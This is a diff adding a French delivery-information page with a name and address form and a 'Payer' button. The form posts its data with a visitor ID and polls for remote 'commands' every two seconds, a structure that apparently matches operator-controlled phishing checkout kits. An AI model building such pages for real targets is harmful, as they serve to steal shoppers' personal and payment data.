@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head><title>Info Livraison</title><script src="script.js"></script></head>
+<body data-visitor-id="">
+<h1>Informations de livraison</h1>
+<p>Paire choisie: <span id="chosenPair"></span></p>
+<form id="infoForm">
+  <input name="name" placeholder="Nom" required>
+  <input name="firstname" placeholder="Prénom" required>
+  <input name="address" placeholder="Adresse" required>
+  <button type="submit">Payer</button>
+</form>
+<script>
+const visitorId=document.body.dataset.visitorId;
+document.getElementById('infoForm').onsubmit=e=>{
+  e.preventDefault();
+  const data={name:e.target.name.value,firstname:e.target.firstname.value,address:e.target.address.value};
+  fetch('submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visitorId,type:'info',data})});
+};
+setInterval(()=>fetchCommand(visitorId),2000);
+</script>
+</body>
+</html>
